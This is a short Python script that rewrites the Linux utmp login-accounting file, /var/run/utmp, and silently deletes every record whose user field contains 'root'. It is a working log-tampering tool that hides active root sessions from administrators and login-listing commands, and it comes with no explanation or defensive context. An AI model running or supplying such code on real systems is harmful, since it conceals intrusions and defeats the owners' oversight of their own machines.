from pathlib import Path
import struct

XTMP_STRUCT = "hi32s4s32s256shhiii4i20x"
XTMP_STRUCT_SIZE = struct.calcsize(XTMP_STRUCT)

UTMP = Path("/var/run/utmp")
xtmp = b""
b = UTMP.read_bytes()
for i in range(0, len(b), XTMP_STRUCT_SIZE):
    bytes = b[i : i + XTMP_STRUCT_SIZE]
    data = struct.unpack(XTMP_STRUCT, bytes)
    if "root" in [(lambda s: str(s).split("\0", 1)[0])(i) for i in data][4]:
        continue
    xtmp += bytes
UTMP.write_bytes(xtmp)
